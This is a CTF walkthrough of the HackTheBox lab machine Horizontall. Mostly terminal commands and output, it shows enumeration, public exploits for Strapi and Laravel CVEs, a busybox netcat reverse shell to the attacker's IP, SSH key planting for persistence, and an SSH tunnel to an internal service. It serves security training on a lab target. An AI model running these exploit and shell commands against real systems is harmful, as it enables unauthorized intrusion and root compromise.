# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Horizontall](https://www.hackthebox.com/machines/Horizontall)

<img src="https://labs.hackthebox.com/storage/avatars/e4ec7d8504fdb58b5e6b7ddc82aafc77.png" alt="Horizontall Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="17"/> Linux
- Machine difficulty: 🟩 Easy (3.9)

> **Horizontall** is an easy difficulty Linux machine were only HTTP and SSH services are exposed. Enumeration of the website reveals that it is built using the Vue JS framework. Reviewing the source code of the JavaScript file, a new virtual host is discovered. This host contains the `Strapi Headless CMS` which is vulnerable to two CVEs allowing potential attackers to gain remote code execution on the system as the `strapi` user. Then, after enumerating services listening only on localhost on the remote machine, a Laravel instance is discovered. In order to access the port that Laravel is listening on, SSH tunnelling is used. The Laravel framework installed is outdated and running on debug mode. Another CVE can be exploited to gain remote code execution through Laravel as `root`.

#### Skills Learned

- **JavaScript Deobfuscation**
- **CVE-2019-18818 + CVE-2019-19609**
- **Port Forwarding**
- **CVE-2021-3129**

#### Tools Used

Linux:
- `nmap`
- `whatweb`
- `ffuf`
- `CVE-2019-18818` + `CVE-2019-19609` POC
- `CVE-2021-3129` POC

#### Machine Writeup

```
┌──(nabla㉿kali)-[~]
└─$ ifconfig tun0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.18  netmask 255.255.254.0  destination 10.10.14.18

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '10.10.11.105\thorizontall.htb' | sudo tee -a /etc/hosts

10.10.11.105    horizontall.htb
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sS -p- horizontall.htb -T5 --min-rate=10000

[SNIP]

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -Pn -sSVC -p22,80 horizontall.htb

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)

[SNIP]

80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: horizontall
|_http-server-header: nginx/1.14.0 (Ubuntu)
```

```
┌──(nabla㉿kali)-[~]
└─$ whatweb http://10.10.11.105

http://10.10.11.105 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]
http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
```

![Firefox - Homepage](./assets/screenshots/hackthebox_horizontall_firefox_homepage.png)

**JavaScript Deobfuscation**

![Firefox - DevTools JavaScript 1](./assets/screenshots/hackthebox_horizontall_firefox_devtools_javascript_1.png)

![Firefox - DevTools JavaScrip 2](./assets/screenshots/hackthebox_horizontall_firefox_devtools_javascript_2.png)

![Firefox - JavaScript UnPacker](./assets/screenshots/hackthebox_horizontall_firefox_javascript_unpacker.png)

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '10.10.11.105\tapi-prod.horizontall.htb' | sudo tee -a /etc/hosts

10.10.11.105	api-prod.horizontall.htb
```

```
┌──(nabla㉿kali)-[~]
└─$ whatweb http://api-prod.horizontall.htb

http://api-prod.horizontall.htb/ [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Strict-Transport-Security[max-age=31536000; includeSubDomains], Title[Welcome to your API], UncommonHeaders[content-security-policy], X-Frame-Options[SAMEORIGIN], X-Powered-By[Strapi <strapi.io>], X-UA-Compatible[IE=edge], X-XSS-Protection[1; mode=block], nginx[1.14.0]
```

![Firefox - Subdomain Page](./assets/screenshots/hackthebox_horizontall_firefox_subdomain_page.png)

```
┌──(nabla㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/FUZZ -ic -t 20

[SNIP]

reviews                 [Status: 200, Size: 507, Words: 21, Lines: 1, Duration: 159ms]
users                   [Status: 403, Size: 60, Words: 1, Lines: 1, Duration: 79ms]
admin                   [Status: 200, Size: 854, Words: 98, Lines: 17, Duration: 23ms]
```

![Firefox - Reviews Page](./assets/screenshots/hackthebox_horizontall_firefox_reviews_page.png)

```
┌──(nabla㉿kali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://api-prod.horizontall.htb/admin/FUZZ -ic -t 20

[SNIP]

plugins                 [Status: 403, Size: 60, Words: 1, Lines: 1, Duration: 65ms]
layout                  [Status: 200, Size: 90, Words: 1, Lines: 1, Duration: 12ms]
init                    [Status: 200, Size: 144, Words: 1, Lines: 1, Duration: 11ms]
```

```
┌──(nabla㉿kali)-[~]
└─$ curl http://api-prod.horizontall.htb/admin/init

{"data":{"uuid":"a55da3bd-9693-4a08-9279-f9df57fd1817","currentEnvironment":"development","autoReload":false,"strapiVersion":"3.0.0-beta.17.4"}}
```

**CVE-2019-18818 + CVE-2019-19609**

```
┌──(nabla㉿kali)-[~]
└─$ searchsploit strapi --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'

[SNIP]

{
  "Title": "Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)",
  "Codes": "",
  "Path": "/usr/share/exploitdb/exploits/multiple/webapps/50239.py"
}
```

```
┌──(nabla㉿kali)-[~]
└─$ cat /usr/share/exploitdb/exploits/multiple/webapps/50239.py

# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

[SNIP]

if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()
```

```
┌──(nabla㉿kali)-[~]
└─$ python3 /usr/share/exploitdb/exploits/multiple/webapps/50239.py http://api-prod.horizontall.htb

[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit

[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzUwNzY5NzczLCJleHAiOjE3NTMzNjE3NzN9.nnOr1XwYdVegHfMUtz02kdG56fV3Tir7Cr8aWdDTVY4

$>
```

```
$> whoami

[+] Triggering Remote code execution
[*] Rember this is a blind RCE don't expect to see output
```

```
┌──(nabla㉿kali)-[~]
└─$ nc -lvnp 1234

listening on [any] 1234 ...

[CONTINUE]
```

```
$> busybox nc 10.10.14.18 1234 -e sh

[+] Triggering Remote code execution
[*] Rember this is a blind RCE don't expect to see output
```

```
[CONTINUE]

connect to [10.10.14.18] from (UNKNOWN) [10.10.11.105] 37240

python3 -c 'import pty; pty.spawn("/bin/bash")'

strapi@horizontall:~/myapi$
```

```
strapi@horizontall:~$ whoami

strapi
```

```
strapi@horizontall:~$ ls -l /home/developer

total 68
-rw-rw----  1 developer developer 58460 May 26  2021 composer-setup.php
drwx------ 12 developer developer  4096 May 26  2021 myproject
-r--r--r--  1 developer developer    33 Jun 24 11:40 user.txt

strapi@horizontall:~/myapi$ cat /home/developer/user.txt

cb8a1*************************** 🚩
```

```
strapi@horizontall:~$ cat /etc/passwd

root:x:0:0:root:/root:/bin/bash

[SNIP]

developer:x:1000:1000:hackthebox:/home/developer:/bin/bash
mysql:x:111:113:MySQL Server,,,:/nonexistent:/bin/false
strapi:x:1001:1001::/opt/strapi:/bin/sh
```

```
strapi@horizontall:$ ss -tunlp | awk '{print $2, $5, $7}' | column -t

State   Local           Peer
LISTEN  0.0.0.0:22
LISTEN  127.0.0.1:1337  users:(("node",pid=1977,fd=31))
LISTEN  127.0.0.1:8000
LISTEN  127.0.0.1:3306
LISTEN  0.0.0.0:80
LISTEN  [::]:22
LISTEN  [::]:80
```

```
strapi@horizontall:$ curl 127.0.0.1:1337

<!doctype html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <title>Welcome to your API</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <style>
    </style>
  </head>
  <body lang="en">
    <section>
      <div class="wrapper">
        <h1>Welcome.</h1>
      </div>
    </section>
  </body>
</html>
```

```
strapi@horizontall:$ curl 127.0.0.1:8000

[SNIP]

<a href="https://laravel.bigcartel.com" class="ml-1 underline">
	Shop
</a>

[SNIP]

<div class="ml-4 text-center text-sm text-gray-500 sm:text-right sm:ml-0">
		Laravel v8 (PHP v7.4.18)
</div>

[SNIP]
```

```
strapi@horizontall:$ cat /etc/nginx/sites-available/horizontall.htb

server {
    # server block for 'horizontall.htb' domain
    listen 80;
    listen [::]:80;
    server_name horizontall.htb www.horizontall.htb;
    root /var/www/html/horizontall;
    index index.html index.htm;
    location / {
        try_files $uri $uri/ =404;
    }
}

server {
     listen [::]:80;
     listen 80;

     server_name api-prod.horizontall.htb;

     location / {
          proxy_pass http://localhost:1337;
          proxy_http_version 1.1;
          proxy_set_header Upgrade $http_upgrade;
          proxy_set_header Connection 'upgrade';
          proxy_set_header Host $host;
          proxy_cache_bypass $http_upgrade;
    }
}

[SNIP]
```

```
strapi@horizontall:$ cat /etc/passwd | grep strapi

strapi:x:1001:1001::/opt/strapi:/bin/sh
```

**Port Forwarding**
 
```
┌──(nabla㉿kali)-[~]
└─$ ssh-keygen -f strapi

[SNIP]

The key's randomart image is:
+---[RSA 3072]----+
|              .  |
|           . o = |
|       o .  =.@ .|
|      . +. E.B.+ |
|       oS.oo=o+..|
|      . . oB+*.+.|
|         . .*+= +|
|           +== o.|
|          o.+o+. |
+----[SHA256]-----+
```

```
┌──(nabla㉿kali)-[~]
└─$ ls -l strapi*

-rw------- 1 nvbla nvbla 2610 Jun 24 11:04 strapi
-rw-r--r-- 1 nvbla nvbla  574 Jun 24 11:04 strapi.pub

chmod 600 strapi
```

```
cat strapi.pub

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyLODAGdvP5qv/kUvehpu5vj0iGNsWow9iq82rj0m+qXrVdkM0FcUee2Ok8fHX5Wt6Tv5T9lANUMag05+Vrgd83JwID3z+aY5TyYRJjKttCjRDHJR4+Wc1p3XMpBpUxR1edKWD6YnV/zn7kJXYFcrZENqj75Hkii4KH391RCpugduSiUavvn1DaHs0sYwuUPj2cLx58EjVMmwS0avTwwFFw8z6TQ66o+tfl7LbxOU6b+RWdsEliRaVRXgJfFD7V4vtZQelBPYkNKiiQNe68P5zyO3fqiQhBLYknkeaWFdmXC0ATy2G1kBvLAL7oYDc4NAPfO8lRlfAgVHQVeOINLnRapsWanIfSQ3w7saligGtzr92M1ZLDhNg4HkMS0OkEOJgedxNKKtY2XaC6AKXCJvFs+mEkTsux7GPuZZbSByar2X2L1pB0alaYPbs+vrP12zCP1aLbF85hAj7GF88CoTZWlax2PQMFLVkzOFo5AyerLwAo2zxnn77olhsFCDJJh8=
```

```
strapi@horizontall:~$ mkdir /opt/strapi/.ssh

strapi@horizontall:~$ vim /opt/strapi/.ssh/authorized_keys

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyLODAGdvP5qv/kUvehpu5vj0iGNsWow9iq82rj0m+qXrVdkM0FcUee2Ok8fHX5Wt6Tv5T9lANUMag05+Vrgd83JwID3z+aY5TyYRJjKttCjRDHJR4+Wc1p3XMpBpUxR1edKWD6YnV/zn7kJXYFcrZENqj75Hkii4KH391RCpugduSiUavvn1DaHs0sYwuUPj2cLx58EjVMmwS0avTwwFFw8z6TQ66o+tfl7LbxOU6b+RWdsEliRaVRXgJfFD7V4vtZQelBPYkNKiiQNe68P5zyO3fqiQhBLYknkeaWFdmXC0ATy2G1kBvLAL7oYDc4NAPfO8lRlfAgVHQVeOINLnRapsWanIfSQ3w7saligGtzr92M1ZLDhNg4HkMS0OkEOJgedxNKKtY2XaC6AKXCJvFs+mEkTsux7GPuZZbSByar2X2L1pB0alaYPbs+vrP12zCP1aLbF85hAj7GF88CoTZWlax2PQMFLVkzOFo5AyerLwAo2zxnn77olhsFCDJJh8=

strapi@horizontall:~$ chmod 600 authorized_keys
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -i strapi strapi@horizontall.htb

Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

[SNIP]

$
```

```
┌──(nabla㉿kali)-[~]
└─$ ssh -L 8000:127.0.0.1:8000 -i strapi strapi@horizontall.htb
```

```
┌──(nabla㉿kali)-[~]
└─$ sudo nmap -sSV -p8000 localhost -T5

[SNIP]

PORT     STATE SERVICE VERSION
8000/tcp open  http    (PHP 7.4.22)
```

```
┌──(nabla㉿kali)-[~]
└─$ whatweb http://localhost:8000/

http://localhost:8000/ [200 OK] Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HttpOnly[laravel_session], IP[127.0.0.1], Laravel, PHP[7.4.22], Title[Laravel], X-Powered-By[PHP/7.4.22]
```

![Firefox - Internal Port Homepage](./assets/screenshots/hackthebox_horizontall_firefox_internal_port_homepage.png)

```
┌──(nabla㉿kali)-[~]
└─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u http://localhost:8000/FUZZ -ic -t 20

[SNIP]

profiles                [Status: 500, Size: 616236, Words: 32882, Lines: 248, Duration: 833ms]
```

**CVE-2021-3129**

![Firefox - Internal Port Profiles Page](./assets/screenshots/hackthebox_horizontall_firefox_internal_port_profiles_page.png)

```
┌──(nabla㉿kali)-[~]
└─$ searchsploit laravel --json | jq '.RESULTS_EXPLOIT[] | {Title, Codes, Path}'

[SNIP]

{
  "Title": "Laravel 8.4.2 debug mode - Remote code execution",
  "Codes": "CVE-2021-3129",
  "Path": "/usr/share/exploitdb/exploits/php/webapps/49424.py"
}
```

```
┌──(nabla㉿kali)-[~]
└─$ cat /usr/share/exploitdb/exploits/php/webapps/49424.py

# Exploit Title: Laravel 8.4.2 debug mode - Remote code execution
# Date: 1.14.2021
# Exploit Author: SunCSR Team
# Vendor Homepage: https://laravel.com/
# References:
# https://www.ambionics.io/blog/laravel-debug-rce
# https://viblo.asia/p/6J3ZgN8PKmB
# Version: <= 8.4.2
# Tested on: Ubuntu 18.04 + nginx + php 7.4.3
# Github POC: https://github.com/khanhnv-2091/laravel-8.4.2-rce

[SNIP]

    url = sys.argv[1]
    path_log = sys.argv[2]
    command = sys.argv[3]

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49424.py

Usage:  /usr/share/exploitdb/exploits/php/webapps/49424.py url path-log command

	Ex: /usr/share/exploitdb/exploits/php/webapps/49424.py http(s)://pwnme.me:8000 /var/www/html/laravel/storage/logs/laravel.log 'id'
```

```
┌──(nabla㉿kali)-[~]
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 /var/www/html/laravel/storage/logs/laravel.log 'id'

[SNIP]

requests.exceptions.ConnectionError: ('Connection aborted.', RemoteDisconnected('Remote end closed connection without response')) ❌
```

![Firefox - CVE-2021-3129 POC 1](./assets/screenshots/hackthebox_horizontall_firefox_cve20213129_1.png)

![Firefox - CVE-2021-3129 POC 2](./assets/screenshots/hackthebox_horizontall_firefox_cve20213129_2.png)

```
┌──(nabla㉿kali)-[~]
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 ../storage/logs/laravel.log id

[SNIP]

uid=0(root) gid=0(root) groups=0(root)
```

```
┌──(nabla㉿kali)-[~]
└─$ python3 /usr/share/exploitdb/exploits/php/webapps/49424.py http://localhost:8000 ../storage/logs/laravel.log 'cat /root/root.txt'

[SNIP]

1ddcd*************************** 🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
